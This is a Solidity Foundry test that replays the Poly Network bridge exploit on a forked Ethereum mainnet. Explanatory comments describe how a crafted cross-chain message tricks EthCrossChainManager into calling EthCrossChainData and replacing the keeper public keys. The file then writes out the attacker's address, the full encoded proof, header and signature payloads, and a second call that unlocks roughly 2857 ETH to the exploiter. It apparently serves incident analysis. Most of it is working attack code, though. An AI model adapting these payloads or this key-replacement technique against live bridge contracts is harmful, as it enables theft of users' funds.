// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";
// import "./utils.sol";

interface IEthCrossChainManager {
    function verifyHeaderAndExecuteTx(
        bytes memory proof,
        bytes memory rawHeader,
        bytes memory headerProof,
        bytes memory curRawHeader,
        bytes memory headerSig
    ) external returns (bool);
}

interface IEthCrossChainData {
    function putCurEpochStartHeight(uint32 curEpochStartHeight) external returns (bool);
    function getCurEpochStartHeight() external view returns (uint32);
    function putCurEpochConPubKeyBytes(bytes calldata curEpochPkBytes) external returns (bool);
    function getCurEpochConPubKeyBytes() external view returns (bytes memory);
    function markFromChainTxExist(uint64 fromChainId, bytes32 fromChainTx) external returns (bool);
    function checkIfFromChainTxExist(uint64 fromChainId, bytes32 fromChainTx) external view returns (bool);
    function getEthTxHashIndex() external view returns (uint256);
    function putEthTxHash(bytes32 ethTxHash) external returns (bool);
    function putExtraData(bytes32 key1, bytes32 key2, bytes calldata value) external returns (bool);
    function getExtraData(bytes32 key1, bytes32 key2) external view returns (bytes memory);
    function transferOwnership(address newOwner) external;
    function pause() external returns (bool);
    function unpause() external returns (bool);
    function paused() external view returns (bool);
    // Not used currently by ECCM
    function getEthTxHash(uint256 ethTxHashIndex) external view returns (bytes32);
}

contract ContractTest is Test {
    struct Header {
        uint32 version;
        uint64 chainId;
        uint32 timestamp;
        uint32 height;
        uint64 consensusData;
        bytes32 prevBlockHash;
        bytes32 transactionsRoot;
        bytes32 crossStatesRoot;
        bytes32 blockRoot;
        bytes consensusPayload;
        bytes20 nextBookkeeper;
    }

    struct ToMerkleValue {
        bytes txHash; // cross chain txhash
        uint64 fromChainID;
        TxParam makeTxParam;
    }

    struct TxParam {
        bytes txHash; //  source chain txhash
        bytes crossChainId;
        bytes fromContract;
        uint64 toChainId;
        bytes toContract;
        bytes method;
        bytes args;
    }

    address exploiter = 0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963;
    address EthCrossChainManager = 0x838bf9E95CB12Dd76a54C9f9D2E3082EAF928270;
    address EthCrossChainData = 0xcF2afe102057bA5c16f899271045a0A37fCb10f2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 12_996_658); //fork mainnet at block 12996658
    }

    function testExploit() public {
        // "Poly has a contract called the "EthCrossChainManager". It's a privileged contract that has the right to trigger messages from another chain. It's a standard thing for cross-chain projects.

        // It has a function named verifyHeaderAndExecuteTx that anyone can call to execute a cross-chain transaction.

        // It (1) verifies that the block header is correct by checking signatures (seems the other chain was a poa sidechain or) and then (2) checks that the transaction was included within that block with a Merkle proof. Here's the code.

        // One of the last things the function does is call executeCrossChainTx, which makes the call to the target contract. This is where the critical flaw sits. Poly checks that the target is a contract, but they forgot to prevent users from calling a very important target... the EthCrossChainData contract

        // By sending this cross-chain message, the user could trick the EthCrossChainManager into calling the EthCrossChainData contract, passing the onlyOwner check. Now the user just had to craft the right data to be able to trigger the function that changes the public keys…

        // https://etherscan.io/tx/0xb1f70464bd95b774c6ce60fc706eb5f9e35cb5f06e6cfe7c17dcda46ffd59581/advanced
        cheats.startPrank(exploiter);
        emit log_named_bytes(
            "existing CurEpochConPubKeyBytes", IEthCrossChainData(EthCrossChainData).getCurEpochConPubKeyBytes()
        );
        bytes memory rawHeader =
            hex"0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000";
        // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/libs/EthCrossChainUtils.sol
        Header memory header = Header({
            version: 0,
            chainId: 0,
            timestamp: 1_628_587_975,
            height: 11_025_028,
            consensusData: 6_968_744_985_048_139_056,
            prevBlockHash: hex"8446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708",
            transactionsRoot: hex"d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a",
            crossStatesRoot: hex"773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717",
            blockRoot: hex"f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834b",
            consensusPayload: hex"7b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d",
            nextBookkeeper: hex"0000000000000000000000000000000000000000"
        });

        bytes memory proof =
            hex"af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d";
        // value length: af
        // ToMerkleValue.txHash length: 20
        // ToMerkleValue.txHash: 80cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a
        // ToMerkleValue.fromChainID: 0300000000000000
        // TxParam.txHash length: 20
        // TxParam.txHash: 0c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f7
        // TxParam.crossChainId length: 08
        // TxParam.crossChainId: ea31000000000000
        // TxParam.fromContract length: 14
        // TxParam.fromContract: e1a18842891f8e82a5e6e5ad0a06d8448fe2f407
        // TxParam.toChainId: 0200000000000000
        // TxParam.toContract length: 14
        // TxParam.toContract: cf2afe102057ba5c16f899271045a0a37fcb10f2
        // TxParam.method length: 0b
        // TxParam.method: 6631313231333138303933
        // TxParam.args length: 1d
        // TxParam.args: 010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b
        // pos: 01
        // nodehash: 362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5
        // pos: 01
        // nodehash: 7b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b33
        // pos: 01
        // nodehash: ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d
        // bytes memory toMerkleValueBs = ECCUtils.merkleProve(proof, header.crossStatesRoot);
        // ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(toMerkleValueBs);
        ToMerkleValue memory toMerkleValue = ToMerkleValue({
            txHash: hex"80cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a", // cross chain txhash
            fromChainID: 3,
            makeTxParam: TxParam({
                txHash: hex"0c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f7", //  source chain txhash
                crossChainId: hex"ea31000000000000",
                fromContract: hex"e1a18842891f8e82a5e6e5ad0a06d8448fe2f407",
                toChainId: 2,
                toContract: abi.encodePacked(EthCrossChainData),
                method: hex"6631313231333138303933", // bytes.fromhex("6631313231333138303933") => b'f1121318093'
                args: hex"010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b"
            })
        });

        // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol#L127
        IEthCrossChainManager(EthCrossChainManager).verifyHeaderAndExecuteTx({ // 0xd450e04c
            proof: proof,
            rawHeader: rawHeader,
            headerProof: hex"",
            curRawHeader: hex"",
            headerSig: hex"7e3359dec445d7d49b80d9999ef2e34f01b6526f2a0b848fcb223201b21ced0e51bece6815510bf7283e98175c0bdfde8b5b1bdc38beef5e7b8ab1b8e8d1b2c900428e40826b3606e0b684d66e9406a5c0d69c16a5cbda8fefe176716f3286e872361ed29bd945b56d5af3a8c581d2b627f679061282f11a6e9b021fe3426faece00e09479bd3581f9eb27be273a761c509f6f20bde1c6a4187fa082c4e55b2f07684034b50075441c51cfc3061879bcf04e5a256b21379f67a2dc0643843bf6438000"
        });
        // a) 0x69d48074: getCurEpochConPubKeyBytes()
        // b) 0x5ac40790: getCurEpochStartHeight()
        // c) 0x0586763c000000000000000000000000000000000000000000000000000000000000000380cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a: checkIfFromChainTxExist(uint64,bytes32)
        // d) 0xe90bfdcf000000000000000000000000000000000000000000000000000000000000000380cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a: markFromChainTxExist(uint64,bytes32)
        // e) 0x41973cd9000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000001d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b0000000000000000000000000000000000000000000000000000000000000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407000000000000000000000000: putCurEpochConPubKeyBytes(bytes) / f1121318093(bytes,bytes,uint64) / func10487987874260605968(bytes,bytes,uint64)

        // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol#L183
        // (success, returnData) = EthCrossChainData.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(toMerkleValue.makeTxParam.method, "(bytes,bytes,uint64)"))), abi.encode(toMerkleValue.makeTxParam.args, toMerkleValue.makeTxParam.fromContractAddr, toMerkleValue.makeTxParam.fromChainId)));
        emit log_named_bytes(
            "changed CurEpochConPubKeyBytes", IEthCrossChainData(EthCrossChainData).getCurEpochConPubKeyBytes()
        );

        // token transfer: https://etherscan.io/tx/0xad7a2c70c958fcd3effbf374d0acf3774a9257577625ae4c838e24b0de17602a
        address AssetProxy = 0x250e76987d838a75310c34bf422ea9f1AC4Cc906;
        // https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/lock_proxy/LockProxy.sol#L64
        emit log_named_uint("balance before", exploiter.balance);
        IEthCrossChainManager(EthCrossChainManager).verifyHeaderAndExecuteTx({
            proof: hex"b12094821f19c671e4c557c358d0780bd2030f3c909df3cb6933607077b9e57d89bd0a00000000000000010001001434d4a23a1fc0c694f0d74ddaf9d8d564cfe2d430020000000000000014250e76987d838a75310c34bf422ea9f1ac4cc90606756e6c6f636b4a14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000",
            // toContract: AssetProxy
            // method: 756e6c6f636b
            // args: 14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000
            // struct TxArgs {
            //     bytes toAssetHash; 0000000000000000000000000000000000000000 // eth
            //     bytes toAddress; C8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963
            //     uint256 amount; 2662f145d8d496e79a0000000000000000000000000000000000000000000000 // 2857486346845890372134
            // }
            rawHeader: hex"00000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000afc014478ad573eaa072aaf625f990b01b1f0733b6070d2e38770f74c4d5fac900000000000000000000000000000000000000000000000000000000000000000000000000ca9a3b020000000000000001000000000000000000000000000000000000000000000000000000000000000000",
            headerProof: hex"",
            curRawHeader: hex"",
            headerSig: hex"0c6539f57b9bd2138b003744d9bd94375111bd0137525073b5b3967b7089d98f47236cea76488260b74cb587dbbeb7c5f35a056a5cf5b63649cd90ff487f386401"
        });
        emit log_named_uint("balance after", exploiter.balance);
    }

    receive() external payable {}
}
